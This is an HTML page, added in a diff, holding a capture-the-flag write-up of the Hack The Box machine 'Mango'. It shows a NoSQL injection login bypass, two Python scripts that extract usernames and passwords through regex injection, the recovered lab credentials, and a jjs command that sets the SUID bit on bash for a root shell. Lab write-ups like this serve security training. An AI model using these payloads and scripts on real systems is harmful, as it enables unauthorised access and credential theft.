@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Mango Writeup | Diego Chávez</title>
+    <link rel="stylesheet" href="../../styles/global.css" />
+    <link rel="stylesheet" href="../../styles/button.css" />
+    <link rel="stylesheet" href="../../styles/about.css" />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://api.iconify.design/simple-icons:hackthebox.svg?color=%23ff0000"
+    />
+    <style>
+      .writeup-img {
+        width: 100%;
+        max-width: 800px;
+        height: auto;
+        border-radius: 8px;
+        border: 1px solid rgba(89, 249, 255, 0.2);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        margin: 12px 0;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="content-wrapper" style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+      
+      <!-- ENCABEZADO Y ETIQUETAS -->
+      <section class="hero" style="text-align: left; margin-bottom: 40px;">
+        <h1 style="color: var(--link-hover-color); font-size: 2.3rem; margin-bottom: 10px;">HTB: Mango</h1>
+        
+        <div class="tags" style="margin: 15px 0; display: flex; gap: 8px; flex-wrap: wrap;">
+          <span style="background: rgba(255,67,80,0.2); color: var(--link-active-1); padding: 4px 10px; border-radius: 5px; font-size: 0.85rem; font-weight: bold;">#Easy</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#linux</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#MongoDB</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#NoSQLI</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#SUID</span>
+        </div>
+      </section>
+
+      <!-- CONTENIDO DEL WRITEUP -->
+      <article class="writeup-body" style="line-height: 1.8; color: #e2e8f0; display: flex; flex-direction: column; gap: 25px;">
+        
+        <div class="step-card" style="background: rgba(22, 2, 61, 0.4); padding: 25px; border-radius: 12px; border: 1px solid rgba(89, 249, 255, 0.15);">
+          
+          <p>First, we send an ICMP ping to check if the target host is active.</p>
+          <img src="./images/Pasted image 20260407131057.png" alt="ICMP Ping Result" class="writeup-img" />
+          <p>Given the TTL close to 64, we confirm that we are dealing with a Linux machine.</p>
+
+          <p style="margin-top: 15px;">Now, let's proceed with port scanning:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.229.185 -oG allPorts</code></pre>
+          <p style="margin-top: 10px;">We discover the following open ports:</p>
+          <img src="./images/Pasted image 20260407132031.png" alt="Open Ports Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Next, we launch a series of service recognition scripts:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">nmap -sCV -p22,80,443 10.129.229.185 -oN targeted</code></pre>
+          <p style="margin-top: 10px;">And we obtain the following results:</p>
+          <img src="./images/Pasted image 20260407132551.png" alt="Nmap Targeted Scan" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We proceed to check if virtual hosting is applied using OpenSSL:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">openssl s_client -connect 10.129.229.185:443</code></pre>
+          <p style="margin-top: 10px;">Therefore, we must add the identified domain names to our <code>/etc/hosts</code> file:</p>
+          <img src="./images/Pasted image 20260407133339.png" alt="Hosts File Configuration" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We check if the <code>mango.htb</code> web application responds:</p>
+          <img src="./images/Pasted image 20260407133538.png" alt="Domain Response Check" class="writeup-img" />
+          <p>And indeed, it does.</p>
+
+          <p style="margin-top: 15px;">We see the following result over HTTPS:</p>
+          <img src="./images/Pasted image 20260407133712.png" alt="HTTPS Page View" class="writeup-img" />
+          <p>With these available options:</p>
+          <img src="./images/Pasted image 20260407133810.png" alt="Web Options" class="writeup-img" />
+
+          <p style="margin-top: 15px;">And this is the result over HTTP:</p>
+          <img src="./images/Pasted image 20260407133737.png" alt="HTTP Page View" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We see this on the main web portal:</p>
+          <img src="./images/Pasted image 20260407133931.png" alt="Main Portal View" class="writeup-img" />
+
+          <p style="margin-top: 15px;">And on the secondary section:</p>
+          <img src="./images/Pasted image 20260407135005.png" alt="Secondary Page View" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We get the following output while analyzing the web application structure:</p>
+          <img src="./images/Pasted image 20260407135440.png" alt="Web Page Analysis" class="writeup-img" />
+
+          <p style="margin-top: 15px;">At this point, we open Burp Suite or CAIDO to inspect how the login mechanism processes requests.</p>
+          <p style="margin-top: 10px;">We observe the following in the HTTP request:</p>
+          <img src="./images/Pasted image 20260407140617.png" alt="Login Intercept Request" class="writeup-img" />
+
+          <p style="margin-top: 15px;">After confirming that standard SQL injection attempts fail, we switch to testing NoSQL injection techniques.</p>
+          <p style="margin-top: 10px;">Therefore, we submit the following payload string:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">username[$ne]=admin&password[$ne]=admin&login=login</code></pre>
+          <p style="margin-top: 10px;">And we obtain:</p>
+          <img src="./images/Pasted image 20260407141549.png" alt="NoSQL Payload Response" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We follow the server response:</p>
+          <img src="./images/Pasted image 20260407141714.png" alt="302 Redirect Response" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Now that we are authenticated, we can perform directory and file fuzzing:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">ffuf -c -fc 404 -u http://staging-order.mango.htb/FUZZ.php -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 80</code></pre>
+          <p style="margin-top: 10px;">We discover <code>/home</code> and <code>/index</code>.</p>
+
+          <p style="margin-top: 15px;">Using Python, we develop custom automation scripts to extract valid usernames and passwords.</p>
+          
+          <p style="margin-top: 10px; font-weight: bold; color: #59f9ff;">User extraction script:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">#!/usr/bin/python3
+from pwn import *
+import requests, re, string, signal, sys, time 
+
+def def_handler(sif, frame):
+    print("\n\n[^^] Exiting...\n")
+    sys.exit(1)
+
+# CTRL C
+signal.signal(signal.SIGINT, def_handler)
+
+# GLOBAL
+login_url = "http://staging-order.mango.htb/"
+characters = string.ascii_lowercase
+
+# Principal Function
+def makeNosqlI():
+    username = ""
+    p1 = log.progress("Brute force")
+    p1.status("[-w-] Starting brute force attack")
+    time.sleep(2)
+
+    p2 = log.progress("User")
+
+    while True:
+        for character in characters:
+            post_data = {
+                'username[$regex]':'^m%s%s.*' % (username, character), 
+                'password[$ne]':'admin',
+                'login':'login'
+            }
+            p1.status("%s" % post_data)
+
+            r = requests.post(login_url, data=post_data, allow_redirects=False)
+            
+            if r.status_code == 302:
+                username += character
+                p2.status(username)
+                break
+
+if __name__ == '__main__':
+    makeNosqlI()</code></pre>
+          <p style="margin-top: 10px;">Through this script, we discover two valid users: <code>admin</code> and <code>mango</code>.</p>
+
+          <p style="margin-top: 15px; font-weight: bold; color: #59f9ff;">Password extraction script:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">#!/usr/bin/python3
+from pwn import *
+import requests, re, string, signal, sys, time 
+
+def def_handler(sif, frame):
+    print("\n\n[^^] Exiting...\n")
+    sys.exit(1)
+
+# CTRL C
+signal.signal(signal.SIGINT, def_handler)
+
+# GLOBAL
+login_url = "http://staging-order.mango.htb/"
+characters = string.ascii_letters + string.digits + string.punctuation
+
+# Principal Function
+def makeNosqlI():
+    password = ""
+    p1 = log.progress("Brute force")
+    p1.status("[-w-] Starting brute force attack")
+    time.sleep(2)
+
+    p2 = log.progress("Password")
+
+    while True:
+        for character in characters:
+            post_data = {
+                'username':'admin', 
+                'password[$regex]': "^%s%s.*" % (password, re.escape(character)),
+                'login':'login'
+            }
+            p1.status("%s" % post_data)
+
+            r = requests.post(login_url, data=post_data, allow_redirects=False)
+            
+            if r.status_code == 302:
+                password += character
+                p2.status(password)
+                break
+
+if __name__ == '__main__':
+    makeNosqlI()</code></pre>
+
+          <p style="margin-top: 10px;">Extracted credentials for <code>admin</code>: <code>t9KcS3>!0B#2</code></p>
+          <p style="margin-top: 5px;">Testing these credentials:</p>
+          <img src="./images/Pasted image 20260407155405.png" alt="Admin Credential Test" class="writeup-img" />
+          <p>Login attempt fails.</p>
+
+          <p style="margin-top: 15px;">Extracted credentials for <code>mango</code>: <code>h3mXK8RhU~f{]f5H</code></p>
+          <p style="margin-top: 5px;">Let's attempt authentication with these credentials.</p>
+          <p>Recalling our initial port scan, we know SSH service is active. We test both credentials via SSH (the <code>mango</code> account successfully grants access):</p>
+          <img src="./images/Pasted image 20260407170211.png" alt="SSH Connection Success" class="writeup-img" />
+
+          <p style="margin-top: 15px;">From here, we locate and read the first user flag:</p>
+          <img src="./images/Pasted image 20260407170546.png" alt="User Flag Retrieval" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Recalling the extracted password for the <code>admin</code> user:</p>
+          <img src="./images/Pasted image 20260407170706.png" alt="Admin Password Verification" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Now, we search for binaries configured with SUID permissions:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">find / -perm -4000 -user root 2>/dev/null</code></pre>
+          <p style="margin-top: 10px;">And we discover the following results:</p>
+          <img src="./images/Pasted image 20260407171118.png" alt="SUID Binaries Found" class="writeup-img" />
+
+          <p style="margin-top: 15px;">So we execute the following command to assign SUID bits to Bash using <code>jjs</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()" | jjs</code></pre>
+          <p style="margin-top: 10px;">The exit status code returns 0, indicating successful execution.</p>
+
+          <p style="margin-top: 10px;">We verify the modified file permissions:</p>
+          <img src="./images/Pasted image 20260407171731.png" alt="Bash Permission Confirmation" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Now we run <code>bash -p</code> to spawn a root-privileged shell:</p>
+          <img src="./images/Pasted image 20260407171838.png" alt="Bash -p Execution" class="writeup-img" />
+
+          <p style="margin-top: 15px;">And verify our active user identity:</p>
+          <img src="./images/Pasted image 20260407171902.png" alt="Root Shell Confirmation" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Then, the root flag is accessible.</p>
+          <p style="margin-top: 5px;">Machine completed:</p>
+          <img src="./images/Pasted image 20260407171948.png" alt="Root Flag Completed" class="writeup-img" />
+
+        </div>
+
+      </article>
+
+      <!-- BOTONES DE RETORNO -->
+      <div class="button-container" style="margin-top: 40px; display: flex; justify-content: center; gap: 15px;">
+        <a href="writeups.html" class="button-33" role="button">Back to Writeups</a>
+        <a href="../" class="button-33" role="button">Back home</a>
+      </div>
+
+    </main>
+  </body>
+</html>
